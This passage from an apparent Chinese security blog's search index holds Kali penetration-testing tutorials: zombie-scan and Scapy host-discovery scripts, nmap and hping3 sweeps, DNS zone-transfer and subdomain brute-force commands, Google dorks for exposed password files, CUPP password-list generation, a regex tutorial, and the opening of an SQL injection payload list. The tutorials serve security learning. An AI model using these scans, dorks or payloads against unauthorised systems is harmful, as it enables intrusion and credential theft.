Zombie Host\\n\") #识别僵尸机\nprint(\"2.----Preform Zombie Scan\\n\")  #执行扫描过程\naws = input(\"Select an Option (1 or 2):\")\nif aws == \"1\":\n  zombie = input(\"Enter IP address to test IPID sequence:\")\n  ipid(zombie)\nelse:\n  if aws == \"2\":\n    zombie = input(\"Enter IP address for zombie System:\\n\")\n    target = input(\"Enter IP address for Scan Target:\\n\")\n    zombiescan(target,zombie)\n\n\n\nnmap—僵尸扫描\n发现僵尸机\n\nnmap -p445 1.1.1.1 –script&#x3D;ipidseq.nse\n\n\n\n\n\n\n\n\n\n\nnmap调用脚本ipidseq.nse进行判断是否是僵尸机\n\n\n\n\n\n\n\n\n\n\n\n\nIncremental!表示空闲状态，可以作为僵尸机\n\n\n\n扫描其他ip\n\n\n\n\n\n\n\n\n\n\n\n\nipidseq值为All zeros，全是0，表示不是一个好的僵尸机\n\n\n\n\n\n进行僵尸扫描\n\nnmap 192.168.216.167 -sI 192.168.216.157 -Pn -p 1-100\n\n\n\n\n\n\n\n\n\n\nnmap的 -sI 参数指定一个僵尸机\n\n\n\n\n\n\n\n","slug":"Kali渗透测试-主动信息搜集【端口扫描】","date":"2022-12-12T02:23:56.000Z","categories_index":"信息搜集","tags_index":"信息搜集,Kali","author_index":"Aurora"},{"id":"562470368a0e4b772e0a77daba1b3bbe","title":"Kali渗透测试-主动信息搜集【四层】","content":"主动信息搜集—四层发现\n\n\n\n\n\n\n\n\n\n优点\n可路由且结果可靠\n不太可能被防火墙过滤\n甚至可以发现所有端口都被过滤的主机\n\n\n缺点\n基于状态过滤的防火墙可能过滤扫描\n全端口扫描速度慢\n\n\nTCP\n未经请求的ACK—RST\n未建立连接，未请求资源直接发送ACK数据包，目标系统会直接给发ACK的来源IP返回一个RST包，通过TCP的这个特性来识别主机是否存活\n\n\nSYN—SYN&#x2F;ACK、RST\n\n\nUDP\nICMP端口不可达、一去不复返\n\n\n\nTCP发现\nACK—TCP Port —RST\n\nScapy\n\ni&#x3D;IP()\n\n\n\n\ni.dst&#x3D;”1.1.1.1”\n\nt&#x3D;TCP()\n\nt.flags&#x3D;’A’\n\n将TCP.flags标志位设置为”A”\n\n\n\n\n\nr&#x3D;(i&#x2F;t)\n\na&#x3D;sr1(r)\n\na.display()\n\n没有经过三次握手直接发送的ACK，目标IP返回RST\n\n目标IP的端口就算没有开启，直接发送ACK，同样也会返回RST\n\n\n\n\n\n使用一行输出\n\na&#x3D;sr1(IP(dst&#x3D;”192.168.216.2”)&#x2F;TCP(dport&#x3D;80, flags&#x3D;’A’),timeout&#x3D;1)\n\n\n\n使用脚本进行扫描\n#!/usr/bin/python\nfrom scapy.all import * \nif len(sys.argv)!=2:\n    print(\"error,use example:./scanhost.py 192.168.10.0\")\n    sys.exit()\n\nip=str(sys.argv[1])\nnet=ip.split(\".\")[0]+\".\"+ip.split(\".\")[1]+\".\"+ip.split(\".\")[2]+\".\"\n\nfor addr in range(1,254):\n    response=sr1(IP(dst=net+str(addr))/TCP(dport=2222,flags=\"A\"),timeout=0.1,verbose=0)\n    try:\n        if (response[TCP].flags) ==\"R\":\n            print(net+str(addr)+\"is up!\")\n    except:\n        pass\n\n\n\n\n\n\n\n\n\n\nUDP发现\n\n\n\n\n\n\n\n\n使用UDP发现时，需要使用不常用的端口进行探测存活主机\n\n利用Scapy\n\n\n\n修改为不常用端口端口\n\n\n\n\n端口未开放，数据包一去不复返\n\n\n\n\n脚本\n#!/usr/bin/python\nfrom scapy.all import * \nif len(sys.argv)!=2:\n    print(\"error,use example:./scanhost.py 192.168.10.0\")\n    sys.exit()\n\nip=str(sys.argv[1])\nnet=ip.split(\".\")[0]+\".\"+ip.split(\".\")[1]+\".\"+ip.split(\".\")[2]+\".\"\n\nfor addr in range(1,254):\n    response=sr1(IP(dst=net+str(addr))/UDP(dport=33333),timeout=0.1,verbose=0)\n    try:\n        if (response[IP].proto) ==1:    # proto字段为 1 时，上层为icmp包\n            print(net+str(addr)+\"is up!\")\n    except:\n        pass\n\n\n\n\n由于脚本扫描的端口为33333，都没有开启，目标不可达\n\n\n\n\n\n\n\n\nNmap\n\n\n\n\n\n\n\n\n基于主机发现使用到的参数\n\nnmap 1.1.1.1-254 -PU53 -sn    # 四层扫描\n扫描211.144.145.1-50这个地址段，UDP的53333端口，-sn不做端口扫描，只做主机发现\n\n\n\n\n\n\nnmap 1.1.1.1-254 -PA80 -sn    # 基于TCP的ACK扫描\nACK方式，若主机存活则会接受到RST包\n\n\n\n\n\n\n\n\nnmap 1.1.1.1 -PO -sn   # 基于IP协议的ping\n\n\n\n\nnmap -iL iplist.txt -PA80 -sn     # 地址列表扫描\n\nHping3\nhping3 –udp 1.1.1.1 -c 1\n基于UDP的ping\n\n\n\n\n\nhping3 1.1.1.1 -c 1                   # 默认扫描TCP\n基于TCP的ping\n\n\n\n\n\n\n","slug":"Kali渗透测试-主动信息搜集【四层】","date":"2022-12-11T09:11:26.000Z","categories_index":"信息搜集","tags_index":"信息搜集,Kali","author_index":"Aurora"},{"id":"fdfdea21437da4c26453fa91e3c5de6d","title":"Kali渗透测试-主动信息搜集【三层】","content":"主动信息搜集—三层发现\n优点\n可路由\n速度比较快\n\n\n缺点\n速度比二层慢\n经常被边界防火墙过滤\n\n\nIP、icmp协议\n\nPing\nping 192.168.216.2 -c 5\n\n-c 指定发送5个包\n\n\n\n\n\nping -R 1.1.1.1      # -R 记录经过的路由\n\n-R参数记录的是离发送端远的端口地址（路由器右端口）\n\n\ntraceroute 1.1.1.1\n\n记录的是离发送端近的端口地址（路由器左端口）\n\n\nping 192.168.216.2 -c 1 | grep “bytes from” | cut -d “ “ -f 4 |cut -d “:” -f 1\n\n\n\n\n\nScapy\n\n\n\n\n\n\n\n\n使用scapy进行三层探测\n\n将IP()赋值给i，将ICMP()赋值给p，再将i和p变量使用/组合起来赋值给ping：ping=(i/p)\n\n查看包头结构\n\n\n\n设置IP包头中的dst字段\n\n\n\n发包\n\n\n\n使用一行发包\n\n\n\n当主机不存活时加入timeout字段，防止scapy扫描中断\n\n\n\n\n\n\nNmap—三层发现\n\n\n\n\n\n\n\n\nnmap 192.168.182.0 -sn  \n扫描三层网段还可以使用-sn参数，当宿主机处于同网段时会进行ARP的扫描，当宿主机处于不同网段时会进行ICMP的扫描\n\nnmap 211.144.145.1 -sn   # 不同网段\n\n\n\n\n\nfping\n\n\n\n\n\n\n\n\n比 ping 功能强大一些，会给出响应时间，字段大小，丢包率等，支持地址段的 ping\n\nfping 192.168.216.2 -c 10\n\n\n\n\nfping -g 192.168.216.100 192.168.216.200 -c 1  # 指定起始和结束的IP地址\n\n-g 进行地址段的扫描，从.100-.200的扫描，每个地址发送一个包\n\nloss 100%非存活主机，loss 0%存活主机\n\n\n\n\nfping  -g 192.168.216.0&#x2F;24 | grep alive  # 添加子网掩码进行网段扫描\n\n\n\n\nfping -f iplist.txt\n\n\n\n\n\n\n\n\n\n\n支持地址列表的方式\n\n\n\nHping\n\n\n\n\n\n\n\n\n能够发送几乎任意TCP&#x2F;IP包\n功能强大但每次只能扫描一个目标\n\nhping3 192.168.216.2 –icmp -c 2\n\n通过循环实现网段扫描\nfor addr in $(seq 1 254); do hping3 192.168.216.$addr –icmp -c 1 &gt;&gt; handle.txt &amp; done\n\n查看handle.txt并用^索引符，从开头进行索引len字段，筛选出活着的主机\n\n\n\n\n\n\n\n","slug":"Kali渗透测试-主动信息搜集【三层】","date":"2022-12-11T01:51:11.000Z","categories_index":"信息搜集","tags_index":"信息搜集,Kali","author_index":"Aurora"},{"id":"569a0f2ea0be37f93bd60ef29cd8c870","title":"Kali渗透测试-主动信息搜集【二层】","content":"主动信息搜集\n\n\n\n\n\n\n\n\n被动信息搜集可能搜集到的信息不是最新的信息，而是历史信息，由此，需要使用主动信息搜集对被动信息搜集得到的结果进行确认和验证，并且通过主动的手段发现更新，更准确，更完善的信息，以致于对后续渗透更有帮助。\n\n直接与目标系统交互通信\n无法避免留下访问的痕迹\n使用受控的第三方电脑进行探测\n使用代理或已经被控制的主机\n做好被封杀的准备\n使用嗓声信息迷惑目标，淹没真实的探测流量\n\n\n扫描\n发送不同的探测，根据返回结果判断目标状态\nIP层\n端口层\n服务层\n\n\n\n发现阶段\n识别存活主机\n潜在的被攻击目标\n\n\n输出一个IP地址列表\n2、3、4层发现\n\n发现—二层发现\n优点：扫描速度快、可靠\n缺点：不可路由\nArp协议\n抓包\n\n\n\nArping\narping 192.168.216.2 -c 1  # -c 参数表示发送包的数量\n收包成功\n\n\n\n收包失败\n\n\n\n抓包\n\n\n\n\n\narping 192.168.216.2 -d   # -d 发现重复的响应，发现两个不同的MAC地址，拥有同一个IP（可进行ARP欺骗，进行中间人攻击）\narp\n\n\n\n\n\narping -c 1 192.168.216.2 | grep “bytes from” | cut -d” “ -f 5 | cut -d”(“ -f 2 | cut -d”)” -f 1\n-c 1 只发送一个包；grep 匹配bytes from数据包；cut -d” “ -f 5通过空格进行筛选第5列的内容； cut -d”(“ -f 2 | cut -d”)” -f 1 通过括号进行筛选第2列和第1列的内容\n\n\n\narping -c 1 192.168.216.2 | grep “bytes from” \n\n\n\narping-c 1 192.168.216.2 | grep “bytes from” | cut -d” “ -f 5 \n\n\n\narping -c 1 192.168.216.2 | grep “bytes from” | cut -d” “ -f 5 | cut -d”(“ -f 2\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nArping只能ping一个目标的IP地址，不能ping一个网段，例如：192.168.216.0&#x2F;24这样的网段是不支持扫描的，因此使用arping的shell脚本来实现对于网段的扫描\n由于从Windows下编写的shell脚本，执行时会提示”bad interpreter:No such file or directory“错误，是文件格式的问题。\n文章地址：http://www.kaotop.com/it/37690.html\n解决方法：\nvim filename\n在使用set ff&#x3D;unix强制转换为unix格式，存盘退出即可：\n\n\n使用arping脚本实现网段扫描\n.&#x2F;arping1.sh eth0\n\n\n\n抓包可以看到在扫描整个网段\n\n\n\n以文件的形式输出\n\n\n\n调用文件的IP进行探测，文件中存在存活IP则输出\n\n\n\n\n\n\nNmap—二层发现\nnmap -sn 192.168.216.2\n-sn 不做端口扫描，只做二层的发现\n可支持地址段的扫描(速度快，内容多):\n\n\nnmap -sn 192.168.216.0&#x2F;24\n\n\n\nnmap -iL iplist.txt -sn\n\n-iL 调用地址列表中的地址进行扫描\n\n\n\n\nnmap -sn参数不只是对Arp进行查询\n\n抓包\n\n\n\n\n\n\n\n\n\n\n\n\nnmap使用-sn进行arp扫描时，还会进行域名解析，查询PTR记录\n\n\n\n\n\n\nNetdiscover\n\n\n\n\n\n\n\n\n可以使用于主动发现，也可以使用于被动发现\n\n专用于二层发现\n可用于无线和交换网络环境\n主动和被动探测\n\n\n主动发现\n\nnetdiscover -i eth0 -r 192.168.216.0&#x2F;24\n\n\n\n\nnetdiscover -l iplist.txt  # 也可以使用IP地址列表进行探测\n\n\n被动\n\n原理：不主动发arp包，只是默默侦听，将网卡置为混杂模式，收取非本网卡IP和MAC地址的数据包，只要网络中某一台机器发了广播包，就可以侦听到这个数据包。（主动arp容易被入侵检测等设备触发报警）\n\nnetdiscover -p\n\n\n\n上图中的passive就是被动式扫描\n\n\n\n触发一个ARP包\n\n\n\n\n\n\n\nScapy\n\n\n\n\n\n\n\n\n作为Python库进行调用\n也可作为单独的工具使用\n抓包、分析、创建、修改、注入网络流量\n\nScapy\n\nScapy中集成大量函数，调用时需要大写\n\nARP().display()\n\n\n直接一行输出指令\nsr1(ARP(pdst&#x3D;”192.168.216.2”))\n\n\n\n定义变量调用函数\n\narp&#x3D;ARP()\n\narp.pdst&#x3D;”192.168.216.2”      # 将目标地址属性字段进行赋值\n\n\n\nsr1()     # 定义好相关参数之后使用Sr1()函数进行发包\n\n接收到应答包\n\n\n\nanswer&#x3D;sr1(arp)    # 将应答包赋给一个变量answer，调用answer.display()显示包结构和内容 \n\n\n\n\n\n\n\n*注：当scapy请求一个不存在的IP是会一直不停的发包，知道该IP接收到为止，这种情况，以至于某一个IP不存在导致后续扫描无法正常进行，由此需要加一个超时时间timeout&#x3D;s，参数verbose&#x3D;1表示将详细的报错信息也显示出来，verbose&#x3D;0则不显示。\n\n使用一个不存在的IP进行扫描\n\n加入timeout字段和verbose字段\n\n\n\n\n\n\nSummary二层发现一般是已经拿到一台机器的控制权，要对内网进行渗透，需要用二层工具获取内网其他的存活主机进行进一步渗透，拿下更多的主机。\n","slug":"Kali渗透测试-主动信息搜集【二层】","date":"2022-12-10T01:36:56.000Z","categories_index":"信息搜集","tags_index":"信息搜集,Kali","author_index":"Aurora"},{"id":"ada03ac2e58b4b7f52c6c416827cfa9d","title":"Kali渗透测试-被动信息搜集【搜索引擎篇】","content":"搜索引擎利用Hacking语法进行信息搜集：\n\n公司新闻动态\n重要雇员信息\n机密文档&#x2F;网络拓扑\n搜索引擎会爬取任何数据，尽管没有对外公布\n\n\n用户名密码\n目标系统软硬件技术架构\n搜索引擎获取Banner信息，了解其架构\n\n\n\nSHODAN\n搜索联网设备\nBanner：http、ftp、ssh、telent\nhttp://www.shodan.io\n常见filter:\nnet（x.x.x.x）\n\n\n\n\ncity\n\n\n\ncounty（CN、US）\n\n\n\nport（80、21、22、23）\n\n\n\nos\nos:”windows 2000”\nos:Linux\n\n\nHostname（主机或域名）\nhostname:baidu.com\n\n\nserver\nserver: Apache&#x2F;2.2.23\n\n\nlinux upnp avtech\n\n\n\n\n\n\n\n\n\n\n\n\n可以根据自己的搜索的习惯定义自己的搜索字段\nGOOGLE搜索\n+支付 -充值\n+表示需要支付关键字，-表示不包含充值关键字\n“支付 充值”：表示双引号内的关键字一起搜索出来\n\n\n北京 intitle:电子商务 intext:法人 intext:电话\n\n\n\n北京 site:alibaba.com inurl:contact\n\n\n\nSOX filetype:pdf（doc、png、ppt）\n\n\n\npayment site:fr（搜索法国[fr]的支付相关页面）\n\n\n\n\n实例inurl:”level&#x2F;15&#x2F;exec&#x2F;-&#x2F;show” （等级为15级的交换机配置页面）\n\n\n\n\nintitle:”netbotz appliance” “ok”（某一个特定类型的机架式的网络摄像头的指令）\ninurl :&#x2F;admin&#x2F;login.php（搜索管理后台）\n\n\n\nfiletype:xls “usename | password”\n\n\n\n\ninurl:Service:pwd（搜索FrontPage的pwd文件[帐号密码]）\n\n\n\n\n\n\n\nhttps://www.exploit-db.com/google-hacking-database\n\n谷歌语法大全（安全人员必备）\n熟悉其中语句\n\n\n\nYANDEX\n\n\n\n\n\n\n\n\n世界第四大搜索引擎—俄罗斯\nhttps://www.yandex.com/\n\nYANDEX 搜索语法参照 GOOGLE 搜索语法\n\n调用搜索引擎并发式搜索theHarvester\n\n\n\n\n\n\n\n\n-d，–domain       要搜索的公司名称或域名。\n-l,  –limit         限制搜索结果的数量，默认&#x3D;500。\n-S, –start         从结果编号 X 开始，默认 &#x3D; 0。\n-g, –google-dork   使用 Google Dorks 进行 Google 搜索。\n-p, –proxies       对请求使用代理，在 proxies.yaml 中输入代理。\n-s, –shodan       使用 Shodan 查询发现的主机。\n–screenshot       对已解析的域进行截图，指定输出目录：–screenshot output_directory\n-v, –virtual-host   通过 DNS 解析验证主机名并搜索虚拟主机。\n-e, –dns-server    用于查找的 DNS 服务器。\n-f，–filename     将结果保存到 XML 和 JSON 文件。\n-b, –source       指定搜索的引擎和数据源\n\n\ntheHarvester -d 163.com -l 200 -b bing\n\n-d 搜索域名163.com，-l 限制数量200条，-b 指定浏览器为bing\n\n\n\n\n通过代理链进行搜索\n\n\n\n\n\n\n\nmetagoofil\n\n\n\n\n\n\n\n\n-d 指定域名\n-e 间隔搜索时间，默认30s，时间太短google会封IP\n-f 保存为html文件\n-i 获取不到的网页在超时之前等待，默认15s\n-l 最大搜索结果，默认100\n-n 限制文件数量下载，默认100\n-o 保存结果的目录\n-r 下载线程数，默认8\n-t 搜索的文件类型（pdf，doc，xls，ppt等）、\n-u 指定UA头\n\n\nproxychains metagoofil -d sina.com -t pdf -l 200 -o test -f\n\n\n\n已经将pdf文件下载到test文件夹\n\n\n\nMALTEGO\n新建视图通过域名搜索\n\n注册的整个过程都需要科学上网\n\nTransforms为Domains[DNS]\n\n\n\n\nTransforms为MX记录\n\n\n\n\nTransforms为NS记录\n\n\n\n\nTransforms为Web站点\n\n\n\n\nTransforms为whois查询\n\n\n\n\nOutput输出为done时表示搜索完成\n\n\n\n\nMALTEGO根据碎片化的信息片段，可以把整个的系统重新构建出来，例如，指定一个文档，一个人，一个电话，一个社交媒体的账号，就可以绘制出整个系统架构。一站式的信息搜集工具，极其强大。\n\n\n\n\n其他途径\n社交网络\n社工\n\n\n工商注册\n新闻组&#x2F;论坛\n招聘网站\n如果招聘安全人员，查看招聘什么安全人员，例如招聘web安全人员，着重关注web站点\n\n\nhttp://www.archive.org/web/web.php\n搜集各大网站的某一时间点的版本，进行跟踪，可以查看历史信息查看当前可能被遗漏的信息，进行后续渗透\n\n\n\n个人专属的密码字典CUPP\n按个人信息生成其专属的密码字典\nCUPP—Common User Password Profiler\ngit clone https://github.com/Mebus/cupp.git\ncupp -i\n\n通过填写相关信息去生成对应的专属密码\n\n\n\n\n\n\nMETADATA（元数据）\nExif图片信息\n图片会记录GPS信息，相机或者手机会记录当前相片地点的GPS位置（前提是需要开启这个功能，一般默认打开），每个照片还会记录当前生成时的信息，例如光圈信息，快门曝光时间是多少等等，这些都是Exif信息。安全人员比较关心的还是设备信息，GPS定位信息。\n使用Kali提供的exif来提取图片信息，设备以及GPS定位信息\n\n\n\n\n\n\nFoca\nwindows工具提取图片的METADATA信息\n\n\n\nRECON-NG\n\n\n\n\n\n\n\n\n全特性的基于web的侦察框架\n基于python开发\n命令格式与msf一致\n调用搜索引擎\n使用方法：\n​\t模块：调用不同的搜索引擎进行搜索\n​\t数据库：搜索结果自动存储数据库\n​\t报告：利用recon-ng搜索结果直接导出报告\n\n参数说明：\n\n\n\n\n\n\n\n\n\n\n\n-w 加载或者创建新的工作区\n-r   从资源文件加载命令\n–stealth 禁用所有被动请求\n–accessible 可用时使用可访问的输出\n\n创建新浪的工作区\nrecon-ng -w sina\n\n\n\nkey参数添加api\n\n\n\n新版本的recon-ng需要自行添加模块\nmarketplace refresh  # 刷新安装的模块\nmarketplace install all  # 安装所有模块\n需要科学上网\n\n\n\n\n\n","slug":"Kali渗透测试-被动信息搜集【搜索引擎篇】","date":"2022-12-06T12:34:10.000Z","categories_index":"信息搜集","tags_index":"信息搜集,Kali","author_index":"Aurora"},{"id":"ef9aad89feb14bc71db83dcf1c572a1d","title":"Kali渗透测试--被动信息搜集","content":"公开渠道搜集被动信息搜集完全基于公开渠道的信息获取，这些信息都是在公开渠道被公开过；被动信息搜集就是通过公开渠道去搜集目标公司以及系统相关的信息，不会与目标系统产生直接交互访问，搜索渠道和手段都是基于搜索引擎，媒体网站等。\n官方信息搜集文章：\n美国军方：\nhttp://www.fas.org/irp/doddir/army/atp2-22-9.pdf\n北大西洋公约组织：http://informaition-retrieval.info/docs/BATO-OSINT.html\n信息搜集内容\nIP地址段\n\n域名信息\n\n邮件地址\n\n社工进行攻击探测\n\n\n文档图片数据\n\n获取企业内部的数据\n社工\n\n\n公司地址\n\n对应无线网络\n社工\n\n\n公司组织架构\n\n不同部门展开不同的社工方式\n\n\n联系电话&#x2F;传真号码\n\n人员姓名&#x2F;职务\n\n目标系统使用的技术架构\n\n通过搜索引擎探测（发现一部分）\n\n\n公开的商业信息\n\n\n信息用途\n用信息描述目标\n通过这些信息重构这家公司，怎么样运作\n\n\n发现\n发现具体主机系统，服务\n\n\n社会工程学攻击\n物理缺口\n物理表攻击\n\n\n\n信息搜集—DNS前言通常来做渗透测试项目时，从客户源只会得到一个DNS域名，后续所有的信息都需要自己进一步信息搜集。\n\n域名解析成IP地址\n\n域名与FQDN的区别\n域名：sina,com\nFQDN(完全限定域名)：www.sina.com\n\n\n\n域名记录：A、C name、NS、MX、PTR\n\nA：主机记录；C name：别名记录；NS：域名服务器地址记录；MX：邮件交换记录；PTR：IP地址解析域名\n\n下图为DNS左边为递归查询流程，右边为迭代查询流程\n\n\n\n\n\n\nDNS信息搜集—NSLOOKUPtype类型参数：a，ns，server，mx，ptr，any，spf\n以www.sina.com为例：\n\nmx查询邮件服务器记录：\n\nns域名服务器地址：\n\n\nany记录，全部查询出来：\n\n（spf记录将ip地址反向解析为域名，用来反垃圾邮件设置）\nDNS信息搜集—DIG\n\n\n\n\n\n\n\n\n多指定几个域名服务器进行查询\n\n指定域名服务器查询：\n\ndig sina.com any @8.8.8.8\n\n\n\ndig +noall mail.163.com any\n\n\n\n\n\n\n\n\n\n参数noall表示什么结果都不输出\n\n\n\n\ndig +noall +answer mail.163.com any\n\n\n\n\n\n\n\n\n\n不输出回答信息\n\n\n\n\ndig +noall +answer -x 8.8.8.8\n\n\n\n\n\n\n\n\n\n-x 参数 反向查询PTR\n\n\n\n\n利用dig查询DNS服务器BIND信息\n\ndig +noall +answer txt chaos VERSION.BIND @ns3.dnsv4.com\n\n\n\n\n\n\n\n\n\n查询ns3.dnsv4.com服务器BIND版本信息，BIND记录类型是txt，类级别是chaos类\n\n\n\n\n\n查询到的版本信息如图。\n\n\n\n\n\n\n\n\n\n可以到BIND官网查询是否是最新的版本，若不是最新版本，查看release描述文件查看最新版本的修复了那些漏洞，进行漏洞利用。\n\n有些DNS的BIND记录查询不到\n\n\ndig追踪查询\n\ndig +trace www.sina.com\n\n查询结果如图，进行的是迭代查询，先去访问了根域，拿到.com域名服务器地址：\n\n之后，再从.com域名服务器中随机挑选一个IP地址192.5.5.241在查询sina.com域的NS记录，之后再从sina.com域名服务器NS记录中随机挑选了一个IP地址192.31.80.30查询www.sina.com，最后解析为C name记录。最终是进行的迭代查询。\n\n抓包查看，本机IP先向本地DNS服务器查询，类型是NS，类是IN（Internet）\n\n\n本地服务器响应包，返回13个根域地址：\n\n\n\n后面其他的DNS数据包同上，进行迭代查询。\n若是进行了DNS劫持，可以使用dig +trace example.com进行追踪查询，其中必有一个DNS服务器的域名不正确。\nDNS区域传输\n\n\n\n\n\n\n\n\n区域传输发生在DNS服务器之间信息同步的过程，一台服务器的数据库变更，同步到其他服务器上，正常情况下区域传输只发生在本域的域名服务器之间；若是配置错误，那任何人可以和域名服务器进行区域传输，任何人都可以拿到所有的主机记录的名称以及IP地址。\n\n若是区域传输配置错误的前提下，使用以下命令可以对目标服务器进行区域传输\n\ndig @ns1.example.com example.com axtr\n\n\n\n\n\n\n\n\n\n指定na1.example.com域名服务器，下载example.com这个域的所有域名记录，区域传输使用的传输方法使用的是axfr，差异化的传输\n\n\n\n\n以ns4.sina.com为例，最终传输错误：\n\n抓包查看其过程：\n\n\n先向本地的域名服务器查询了ns4.sina.com的A记录，本地域名服务器返回解析IP，之后进行区域传输时，进行TCP连接（域名查询的时候使用UDP），再进行AXFR类型的查询，最后拒绝连接。\n\nhost -T -l sina.com ns3.sina.com\n\n\n\n\n\n\n\n\n\n-l 参数进行AXFR的传输，-T 表示时间\n\n\n\n同样也是拒绝连接。\n\n\n和dig命令相同，host命令同样也是先向本地域名服务器查询ns.sina.com的A记录和4A记录之后本地域名服务器将查询结果返回本地，然后本地向查询到的IP进行TCP连接，接着进行AXFR类型的查询，最终断开连接。\nDNS字典爆破\nfierce –dns-servers 8.8.8.8 –domain example.com.cn –subdomain-file  a.txt\nfierce命令，参数--dns-server指定dns服务器，参数--domain指定要查询那个域，--subdomain-file 后面指定字典\n\n由于本地没有a.txt字典，使用dpkg查询一下fierce自带的字典路径\n\n命令：dpkg -L fierce\ndpkg基于debin的Linux的包管理程序，-L参数可以列出在系统上安装的相关生成的文件\n\n使用more查看5000.txt\n\n使用cat查看是否有www之类的字段\n命令：cat &#x2F;usr&#x2F;lib&#x2F;python3&#x2F;dist-packages&#x2F;fierce&#x2F;lists&#x2F;5000.txt | grep www\n\n\n\n进行爆破\n\n\n\n\n\n\n\n\n\n\nfierce –dns-servers 8.8.8.8 –domain sina.com.cn –subdomain-file  &#x2F;usr&#x2F;lib&#x2F;python3&#x2F;dist-packages&#x2F;fierce&#x2F;lists&#x2F;5000.txt\n\n\n\n\n​        此时Found表示已经爆破出相关的子域名。\n\n\n\ndnsdict6 -d4 -t 16 -u sina.com\n-d4 显示ipv4&#x2F;6的地址 -t 可指定线程数；-x 指定使用什么级别的字典\n-s 小字典；-m 普通字典；-l 大字典；-x 更大字典；-u 超级字典\n-D 手动指定字典\n\n\n\n\n\ndnsenum -f  dnsdict.txt -dnsserver 8.8.8.8 sina.com -o sina.xml\n-f 指定字典；-dnsserver 指定DNS服务器；-o 可导出xml文件\n\n\n使用dpkg查找字典信息\n\n\n\ndnsenum -f  &#x2F;usr&#x2F;share&#x2F;dnsenum&#x2F;dns.txt  -dnsserver 8.8.8.8 sina.com -o sina.xml \n\n\n\n\n\n\ndnsenum可以查询出NS，MX以及区域传输AXFR等信息。\n\n\n\ndnsmap sina.com -w dns.txt \n-w 指定字典\n\n\ndnsmap sina.com -w &#x2F;usr&#x2F;share&#x2F;dnsmap&#x2F;wordlist_TLAs.txt\n\n\n\ndnsrecon -d sina.com –lifetime  10 -t brt -D dnsbog.txt\n-d 指定域名；--lifetime 超时时间；-t 指定查询强度，brt表示暴力爆破；-D 指定字典\n\n\n\n\ndnsrecon -d sina.com –lifetime  10 -t brt -D &#x2F;usr&#x2F;share&#x2F;dnsrecon&#x2F;namelist.txt\n\n\n\ndnsrecon -d sina.com –lifetime 10 -t std -D  &#x2F;usr&#x2F;share&#x2F;dnsrecon&#x2F;namelist.txt\n和上面的相同，这里的-t std表示标准爆破\n\n\n\n\n\n\n\n\nDNS注册信息\nWhois查询\n\nWhois -h whois.apnic.net x.x.x.x\n\n域名注册信息查询网站\nhttp:&#x2F;&#x2F;www.afrinic.net\nhttp:&#x2F;&#x2F;www.apnic.net\nhttp:&#x2F;&#x2F;ws.arin.net\nhttp:&#x2F;&#x2F;www.iana.com\nhttp:&#x2F;&#x2F;www.icann.org\nhttp:&#x2F;&#x2F;www.lacnic.net\nhttp:&#x2F;&#x2F;www.nro.net\nhttp:&#x2F;&#x2F;www.ripe.net\nhttp:&#x2F;&#x2F;www.inernic.net\n\n\nKali下的Whois查询\n\n\n\n后续可以使用社工进行攻击\n\n​\n\n\n","slug":"Kali渗透测试-被动信息搜集【DNS篇】","date":"2022-12-05T02:18:26.000Z","categories_index":"信息搜集","tags_index":"信息搜集,Kali","author_index":"Aurora"},{"id":"03a1af7058cec8bb8efe418ed228e157","title":"正则表达式","content":"0x00脑图：\n0x01 正则语法（入门）\n字符组（[]）允许匹配一组可能出现的字符。\n\n区间：\n\n连字符(-)代表区间：\n要匹配任意数字可以使用[0-9]；\n如果想要匹配所有小写字母，可以写成[a-z]；\n想要匹配所有大写字母可以写成[A-Z]。\n\n\n匹配特殊字符\n\n使用\\进行都特殊字符转义 例：[\\[\\-\\(]\n\n\n取反\n\n通过在字符数组开头使用 ^ 字符实现取反操作，从而可以反转一个字符组（意味着会匹配任何指定字符之外的所有字符）。\nn[^e]：n后面的字母不能为 e\n\n\n快捷匹配数字和字母\n\n\n\n\n快捷方式\n描述\n\n\n\n\\w\n与任意单词字符匹配，任意单词字符表示 [A-Z]、 [a-z]、[0-9]、_\n\n\n\\d\n与任意数字匹配\n\n\n\n\\s快捷方式可以匹配空白字符，比如空格，tab、换行等。\n\n\\b 匹配的是单词的边界：\\bmaster\\b 就仅匹配有边界的master单词。\n\n\n\n快捷方式取反\n\n\\w的取反为\\W，将小写改写成大写即可（其他快捷方式也遵循这个规则）。\n\\D的取反为\\d，取非数字\n\n\n开始和结束\n\n正则表达式中 ^指定的是一个字符串的开始，$指定的是一个字符串的结束。\n可匹配多行\n\n\n任意字符\n\n.字符代表匹配任何单个字符，它只能出现在方括号以外\n.字符只有一个不能匹配的字符，也就是换行符（\\n）\n\n\n可选字符\n\n使用 ? 符号指定一个字符、字符组或其他基本单元可选，这意味着正则表达式引擎将会期望该字符出现零次或一次。\n例：favorite和favourite–&gt;favou?rite\n\n\n重复\n\n在一个字符组后加上&#123;N&#125; 就可以表示在它之前的字符组出现N次\n\n\n重复区间\n\n重复区间，语法：&#123;M,N&#125;，M是下界而N是上界。\n\n\n开闭区间\n\n闭区间不写即可表示匹配一个或无数个；例：\\d&#123;1,&#125;\n可以使用两个速写字符指定常见的重复情况，可以使用 + 匹配1个到无数个，使用 *代表0个到无数个。即：**+等价于&#123;1,&#125;，*等价于&#123;0,&#125;。**\n例：f.+\n\n\n\n0x02 练习\n匹配所有手机号码：\n\n必须是11位的数字；\n第一位数字必须以1开头，第二位数字可以是[3,4,5,7,8]中的任意一个，后面9个数是[0-9]中的任意一个数字。\n\n正则匹配：^1[34578]\\d&#123;9&#125;\n\n匹配网站地址\n\n匹配以 http开头，以/结尾的所有数据。\n\n正则匹配：^http.+/$\n\n\n0x03 进阶","slug":"正则表达式","date":"2022-10-31T00:38:44.000Z","categories_index":"Python","tags_index":"Python","author_index":"Aurora"},{"id":"54b1a02585172138db622471e54a6e9c","title":"SQL注入Payload汇总","content":"0x00 文章出处文章来源：khan安全攻防实验室\n\n0x01 通用 SQL 注入负载&#39;\n&#39;&#39;\n&#96;\n&#96;&#96;\n,\n&quot;\n&quot;&quot;\n&#x2F;\n&#x2F;&#x2F;\n\\\n\\\\\n;\n&#39; or &quot;\n-- or # \n&#39; OR &#39;1\n&#39; OR 1 -- -\n&quot; OR &quot;&quot; &#x3D; &quot;\n&quot; OR 1 &#x3D; 1 -- -\n&#39; OR &#39;&#39; &#x3D; &#39;\n&#39;&#x3D;&#39;\n&#39;LIKE&#39;\n&#39;&#x3D;0--+\n OR 1&#x3D;1\n&#39; OR &#39;x&#39;&#x3D;&#39;x\n&#39; AND id IS NULL; 